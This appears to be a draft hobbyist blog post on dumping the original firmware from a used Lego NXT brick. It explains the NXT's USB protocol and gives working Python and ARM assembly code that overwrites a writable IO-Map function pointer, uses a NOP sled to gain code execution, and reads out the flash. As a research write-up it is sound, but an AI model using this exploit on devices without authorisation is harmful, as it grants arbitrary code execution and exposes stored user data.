Title: Dumping Lego NXT firmware off of an existing brick
Date: 2025-07-28
Summary: Catgirls can have little a RCE, as a treat
Status: draft

I've recently been contributing to the [Pybricks](https://github.com/pybricks/) project, a community-run port of MicroPython to Lego Mindstorms hardware. As part of that, I obtained a used [Lego NXT](https://en.wikipedia.org/wiki/Lego_Mindstorms_NXT) which just so happened to still be running the original version 1.01 firmware from when it launched in 2006. I wanted to archive a copy of this firmware, but doing so required taking a bit of a detour.

# Preliminary research

Or, in the words of a much more innocent era, "Google is your friend" <small>(lol, not anymore)</small>.

"Surely somebody must've already archived a copy of this firmware, right?" I thought to myself. Unfortunately, this does not seem to have been the case. There appear to have been several firmware updates over the years (e.g. for better LabVIEW support, or as part of the NXT 2.0 set). There might've even been a patch released on or very close to launch day? Many advanced users back in the day also often used modified or alternative firmwares.

The NXT is also old enough that, despite being part of "the Internet era", resources are starting to bitrot. All of this is to say that I couldn't find a copy of version 1.01 anywhere. Time to retrieve a copy myself!

# Use the firmware updater?

An initial idea to consider is "does the tool which is used to download new firmware to the NXT also allow retrieving firmware?"

The NXT is built around a Microchip (formerly Atmel) [AT91SAM7S256](https://www.microchip.com/en-us/product/at91sam7s256) microcontroller, a distant ancestor of the SAM D parts that now power several Arduino, MicroPython, and CircuitPython boards. This chip contains a built-in bootloader program called SAM-BA which supports simple "read from memory" (traditionally, `PEEK`) and "write to memory" (traditionally, `POKE`) commands. This (deceptively!) seems like it'd work!

Fortunately, by researching, it turns out that [somebody did try this already](https://bricks.stackexchange.com/questions/16909/) and was _unsuccessful_. Attempting to enter the SAM-BA bootloader appears to automatically _wipe_ part of the firmware which we want to back up. Good thing I did my research first! We have to find a different approach that doesn't involve entering firmware update mode.

# Use JTAG?

JTAG is a hardware interface used for providing all sorts of "debug" and "test" functionality for circuit boards and chips. The microcontroller in the NXT supports JTAG for debugging. This can be used to copy data from the chip.

Unfortunately, since this is a _hardware_ interface, using it involves taking apart the NXT and soldering to it (since the necessary connectors are not installed). Additionally, this chip is so old that its debug interfaces are cumbersome to set up and use (it doesn't support <abbr title="Serial Wire Debug">SWD</abbr>, <abbr title="Arm Debug Interface, version 5">ADIv5</abbr>, or any of the interfaces that the cheap modern tools are designed for).

I considered this method a last resort but really wanted to find a software-only solution. If I found a generic-enough method, it would even be possible to release it so that other people could back up the firmware of bricks in their possession.

# Use a custom NXT program?

How do NXT programs work? Can we just write an NXT program that dumps the firmware and sends it to the computer?

If we hunt around, we can [find](http://www.cee.uma.pt/droide2/plataforma/documentation/fantom.pdf) the "LEGO MINDSTORMS NXT Executable File Specification" which explains that NXT programs run in a bytecode <abbr title="Virtual Machine">VM</abbr> and doesn't have the ability to read/write arbitrary memory. Variables are restricted to a "data segment" of fixed size. So this doesn't work.

# The NXT firmware

For those who aren't aware, the NXT firmware actually has its source code publicly available! However, many links to it are bitrotted, source code does not appear to be available for _every_ version, and it's not even clear which versions of the code still exist. (For example, the seemingly-official `LEGO-Robotics/NXT-Firmware` repository on GitHub... is a community-modified firmware! It also only contains versions 1.05 and 1.29 and not, for example, the final 1.31.)

Nonetheless, we can still [study it](https://github.com/dlech/nxt-firmware) to see if we can find anything interesting. We can also study a [copy of the Bluetooth Developer Kit](https://github.com/Chris00/ocaml-mindstorm/tree/master/doc/NXT/BDK) in order to understand how the computer communicates with the brick. (Despite being the "Bluetooth" developer kit, the documented protocol and commands are used over USB as well.)

## NXT communications protocol

From reading through the "LEGO MINDSTORMS NXT Communication Protocol" and "LEGO MINDSTORMS NXT Direct Commands" documents, the following high-level overview starts to take shape:

The protocol contains two categories of commands, "system" and "direct". System commands vaguely relate to "operating system" functionality, and direct commands vaguely relate to "actually operating a robot". In general, the goal of this protocol seems to be to specifically *not* allow performing arbitrary badness and arbitrary code execution. It appears to be designed to give friendly access to only the NXT's virtual filesystem and bytecode interpreter.

Looks like we're going to need to find some kind of exploit.

## IO-Maps

While looking through all of these documents, I generally focused my attention on "low-level" functionality, as it is much more likely to contain the ability to access the firmware and/or arbitrary memory. One feature, "IO-Maps", immediately stood out.

In the NXT Communication Protocol document, IO-Maps are described as "the well-described layer between the different controllers/drivers stack and the VM running the user's code." That sounds potentially interesting if it could allow access to drivers in ways which aren't normally allowed. Also, if this interface isn't normally used, it seems like a potential location for unexpected and exploitable bugs.

So... where does one find the so-called "well-described" description of what IO-Maps can do?

One of the best explanations I found was [an old copy of the NXC programmer's guide](http://lego.itam.mx/misc/manuales/NXC/guide.pdf). NXC (Not eXactly C) is an alternative frontend for creating NXT programs in a C-like language rather than graphical blocks. This programmer guide lists all of the IO-Map offsets for each firmware module, and the explanations make it clear that IO-Maps contain essentially all of each module's internal state.

Further searching finds [this](https://ni.fr.eu.org/lego/nxt_memory_access/) blog post explaining how it's possible to watch and plot variables in the user program by reading from the VM's IO-Map. It definitely feels like we could be on to something here!

### IO-Maps in the firmware source code

How do you find the IO-Map structures in the firmware source code? That blog post lists a `struct`, but where is said struct?

It turns out that all IO-Maps are defined in `.iom` files in the firmware, with the VM's being defined in [`c_cmd.iom`](https://github.com/dlech/nxt-firmware/blob/master/AT91SAM7S256/Source/c_cmd.iom).

# Big fat exploit

Without even having to look at any other modules, we can already spot something: the VM IO-Map contains a function pointer `pRCHandler`! What does this function pointer do?

It turns out that [this is the command handler for "direct" commands](https://github.com/dlech/nxt-firmware/blob/master/AT91SAM7S256/Source/c_comm.c#L392-L414)!

Is this... really just a native code function pointer sitting inside this IO-Map structure which is both readable *and* writable over USB?

## Scoping out the exploit

In order to try out whether this can possibly even work, we are going to start by typing commands manually into the [Python](https://www.python.org/) <abbr title="read-eval-print-loop">REPL</abbr>. We'll need to install the [PyUSB](https://github.com/pyusb/pyusb) module in order to be able to talk to the NXT.

<small>Setting up drivers and USB permissions will be left as an exercise for the reader</small>

First we need to open a connection to the NXT:

```python
>>> import usb.core
>>> dev = usb.core.find(idVendor=0x0694, idProduct=0x0002)
>>> dev.set_configuration()
```

Then we need to see if we can indeed access the VM (or "command") module's IO-Map:

```python
>>> dev.write(1, b'\x01\x94\x01\x00\x01\x00\x00\x00\x10\x00')
10
>>> bytes(dev.read(0x82, 64))
b'\x02\x94\x00\x01\x00\x01\x00\x10\x00MindstormsNXT\x00\x00\x00'
```

Uhh... what? Here's an explanation for people who do not spend all day staring at hex dumps.

The "Read IO Map Command" request is documented to take 10 bytes. Here, we've manually input each one of them using a hexadecimal escape sequence. The first two bytes are required to be 0x01 and 0x94: `\x01\x94`. This is followed by the module ID in little-endian format: `\x01\x00\x01\x00`. This corresponds to a module ID of <span class="tabnum">0x00010001</span> representing the VM module. The next two bytes `\x00\x00` correspond to an offset of 0. Finally, the last two bytes `\x10\x00` correspond to a length of 0x10 or 16. This command means "read 16 bytes from offset 0 of the VM module's IO map".

In order to get back the data we wanted, we send a read command to USB endpoint <span class="tabnum">0x82</span> (don't worry about it, but if you're curious you can find the endpoint address from the USB descriptors). Decoding it according to the documentation, we find that the first bytes `\x02\x94` are exactly as expected. The next byte, `\x00`, means that the command succeeded. We have a repeat of the module ID `\x01\x00\x01\x00` and the requested length `\x10\x00`, and finally we have the data which was read: `MindstormsNXT\x00\x00\x00`. This data corresponds to `FormatString` [in the code](https://github.com/dlech/nxt-firmware/blob/master/AT91SAM7S256/Source/c_cmd.iom#L181), and [here](https://github.com/dlech/nxt-firmware/blob/master/AT91SAM7S256/Source/c_cmd.c#L1167) it is initialized to the value that we see.

Let's try reading that function pointer now:

```python
>>> dev.write(1, b'\x01\x94\x01\x00\x01\x00\x10\x00\x04\x00')
10
>>> dev.read(0x82, 64)
array('B', [2, 148, 0, 1, 0, 1, 0, 4, 0, 61, 13, 16, 0])
>>> hex(16 << 16 | 13 << 8 | 61)
'0x100d3d'
```

We've read 4 bytes from offset 16, and it gave us a little-endian value of <span class="tabnum">0x100d3d</span>. What does this number mean?

If we look at [the datasheet for the AT91SAM7S256 microcontroller](https://ww1.microchip.com/downloads/en/DeviceDoc/doc6175.pdf) and look at Figure 8-1 "SAM7S512/256/128/64/321/32/161/16 Memory Mapping", we can see that memory addresses in the range <span class="tabnum">0x001<em>xxxxx</em></span> correspond to the internal flash memory of the chip. This means that the pointer is <span class="tabnum">0xd3d</span> bytes or about 3 KiB into the firmware. Certainly looks like a reasonable function pointer! If we modify this function pointer, we should be able to hijack code execution the moment we send a "direct" command.

## Gaining code execution

What can we modify this pointer _to_ in order to gain arbitrary code execution? On a modern system with memory protections and advanced exploit mitigations, this may end up being a challenging task. However, this microcontroller has none of these features. We should be able to put in _any_ valid address and have the microcontroller execute it as code (as long as we've put valid code there).

What addresses do we pick though? We don't know precisely how the memory is laid out, and we don't have an exact match for the source code either. However, here's where we get very lucky.

Inside the VM's IO-Map, there is a [`MemoryPool`](https://github.com/dlech/nxt-firmware/blob/master/AT91SAM7S256/Source/c_cmd.iom#L196) variable corresponding to the data segment of the running NXT program. This variable is [32 KiB](https://github.com/dlech/nxt-firmware/blob/master/AT91SAM7S256/Source/c_cmd.iom#L149) in size, which means that we have 32 KiB of space that we can fill with whatever we want (as long as no program is running). The microcontroller has a total of 64 KiB of RAM. Observe that 32 KiB is _half_ of that total.

If we assume that the firmware lays out RAM starting from the lowest address and going up, and that the firmware uses more than 0 bytes of RAM (both very reasonable assumptions), there is *no possible location* the firmware could put this memory pool that doesn't intersect with the address 32 KiB past the start of RAM, <span class="tabnum">0x00208000</span>.

Since we don't know _exactly_ where the buffer sits in RAM, we can fill the initial part of the buffer with `nop` (no operation) instructions. We put our "exploit" code at the very end of the buffer. As long as our pointer guess doesn't end up _too_ close to the end, it will end up somewhere in the pile of `nop`s. The CPU will keep executing the `nop`s until it finally hits our code. This exploitation technique is called a "NOP slide" or "NOP sled".

In order to test this out, we need a bunch of scaffolding:

```python
import struct
import subprocess
import usb.core

def iomap_rbytes(mod, off, len_):
    cmd = struct.pack("<BBIHH", 1, 0x94, mod, off, len_)
    dev.write(1, cmd)
    result = bytes(dev.read(0x82, 64))
    # print(result)
    assert result[:9] == struct.pack("<BBBIH", 2, 0x94, 0, mod, len_)
    result_val = result[9:]
    return result_val

def iomap_r32(mod, off):
    cmd = struct.pack("<BBIHH", 1, 0x94, mod, off, 4)
    dev.write(1, cmd)
    result = bytes(dev.read(0x82, 64))
    # print(result)
    assert result[:9] == struct.pack("<BBBIH", 2, 0x94, 0, mod, 4)
    result_val = struct.unpack("<I", result[9:])[0]
    return result_val

def iomap_w32(mod, off, val):
    cmd = struct.pack("<BBIHHI", 1, 0x95, mod, off, 4, val)
    dev.write(1, cmd)
    result = bytes(dev.read(0x82, 64))
    # print(result)
    assert result == struct.pack("<BBBIH", 2, 0x95, 0, mod, 4)

def testbeep():
    cmd = b'\x00\x03\xff\x00\xff\x00'
    dev.write(1, cmd)
    result = bytes(dev.read(0x82, 64))
    print(result)

CMD_MODULE = 0x00010001
CMD_OFF_FNPTR = 16
CMD_OFF_MEMPOOL = 52

subprocess.run(['arm-none-eabi-gcc', '-c', 'nxtpwn.s'], check=True)
subprocess.run(['arm-none-eabi-objcopy', '-O', 'binary', 'nxtpwn.o', 'nxtpwn.bin'], check=True)
with open('nxtpwn.bin', 'rb') as f:
    nxtpwn_code = f.read()
print("code", nxtpwn_code)
assert len(nxtpwn_code) % 4 == 0

ARM_NOP = 0xe1a00000
nop_len = 32*1024 - len(nxtpwn_code)

dev = usb.core.find(idVendor=0x0694, idProduct=0x0002)
dev.set_configuration()

print("filling memory...")
for i in range(nop_len // 4):
    iomap_w32(CMD_MODULE, CMD_OFF_MEMPOOL + i*4, ARM_NOP)
for i in range(len(nxtpwn_code) // 4):
    offs = nop_len + i*4
    val = struct.unpack("<I", nxtpwn_code[i*4:i*4+4])[0]
    iomap_w32(CMD_MODULE, CMD_OFF_MEMPOOL + offs, val)
```

If you run this code using `python3 -i nxtpwn.py`, it will fill the VM `MemoryPool` with `nop`s followed by the assembly code written in `nxtpwn.s`. To start with, we can use the most basic assembly code:

```asm
bx lr
```

This is an empty function which doesn't do anything.

Before we actually trigger any exploits, let's try running a "direct" command:

```python
>>> testbeep()
b'\x02\x03\x00'
```

This should make the NXT beep.

To trigger the exploit, we can enter the following:

```python
>>> iomap_w32(CMD_MODULE, CMD_OFF_FNPTR, 0x00200000 + 32*1024)
```

This replaces that function pointer with an address in RAM as described above. Now let's try to make the NXT beep again:

```python
>>> testbeep()
b'\x02\x03\x00\x01\x00\x01\x00'
```

This time the NXT doesn't beep (because we've replaced the function which handles direct commands with an empty function) and returns different (garbage) data (because the empty function doesn't set the output length properly either).

# Dumping firmware

Now that we have code execution, we can access any data inside the microcontroller. In order to do so, we need to write some assembly code which lets us read arbitrary memory addresses. The direct command handler is actually an excellent location to hijack because it is already hooked up to all the infrastructure needed to communicate to and from the PC.

In the firmware source code, we can see that this [command handler](https://github.com/dlech/nxt-firmware/blob/master/AT91SAM7S256/Source/c_cmd.c#L367) normally takes three arguments: the input buffer, the output buffer, and a pointer to the length of the output. According to the ARM <abbr title="Application Binary Interface">ABI</abbr>, these values will be stored in CPU registers `r0`, `r1`, and `r2` respectively.

We can replace this command handler with a function that reads from an arbitrary address that we give it:

```asm
# save r4
push {r4}

# skip 2 bytes of packet
add r0, #2

# load 4 bytes of the address
ldrb r3, [r0]
add r0, #1
ldrb r4, [r0]
add r0, #1
orr r3, r4, lsl #8
ldrb r4, [r0]
add r0, #1
orr r3, r4, lsl #16
ldrb r4, [r0]
add r0, #1
orr r3, r4, lsl #24

# read data from that address
ldr r3, [r3]

# store 4 bytes of the resulting value
strb r3, [r1]
add r1, #1
lsr r3, #8
strb r3, [r1]
add r1, #1
lsr r3, #8
strb r3, [r1]
add r1, #1
lsr r3, #8
strb r3, [r1]

# store the output length of 4
mov r3, #4
strb r3, [r2]

# return success
mov r0, #0
pop {r4}
bx lr
```

We can now add some more code to the Python script as well:

```python
print("sending pwn command")
iomap_w32(CMD_MODULE, CMD_OFF_FNPTR, 0x00200000 + 32*1024)

def pwn_read(addr):
    cmd = struct.pack("<BBI", 0, 0xaa, addr)
    dev.write(1, cmd)
    result = bytes(dev.read(0x82, 64))
    # print(result)
    assert result[:2] == struct.pack("<BB", 2, 0xaa)
    result_val = struct.unpack("<I", result[2:])[0]
    return result_val
```

This code sends a "direct" command with a dummy command byte of 0xaa (the firmware assumes this exists) followed by an address we want to read. The result contains the dummy command followed by 4 bytes of data. We can now try it out:

```python
>>> hex(pwn_read(0))
'0xeafffffe'
>>> hex(pwn_read(0))
'0xeafffffe'
>>> hex(pwn_read(4))
'0xeafffffe'
>>> hex(pwn_read(8))
'0xeafffffe'
>>> hex(pwn_read(0xc))
'0xeafffffe'
>>> hex(pwn_read(0x10))
'0xeafffffe'
>>> hex(pwn_read(0x14))
'0xeafffffe'
>>> hex(pwn_read(0x18))
'0xea000009'
>>> hex(pwn_read(0x1c))
'0xe1a09000'
>>> hex(pwn_read(0x20))
'0xe5980104'
```

This certainly looks like valid ARM code! (The leading 0xe indicates an instruction which is always executed (as opposed to only executed if some test is true), and `0xeafffffe` is an infinite loop.)

All we need to do now is to loop over 256 KiB starting at <span class="tabnum">0x001<em>xxxxx</em></span> and save it to a file:

```python
print("reading flash...")
with open('nxtpwn-dump.bin', 'wb') as f:
    for i in range(256 * 1024 // 4):
        addr = 0x00100000 + i * 4
        val = pwn_read(addr)
        f.write(struct.pack("<I", val))
        if i % 1024 == 0:
            print(f"\tDone with {(i // 1024 + 1) * 4}/256 KiB")
```

And with that, we have the firmware:

```
$ xxd nxtpwn-dump.bin | less
…
00019cd0: 3032 5800 4d61 7220 2033 2032 3030 3600  02X.Mar  3 2006.
00019ce0: 3138 3a32 313a 3033 004a 616e 4665 624d  18:21:03.JanFebM
…
```

Dumping the firmware in this manner also dumps all of the user programs and data stored on the brick, so I won't be releasing this until I clean it up a bit (so as to protect the privacy of the previous owners).
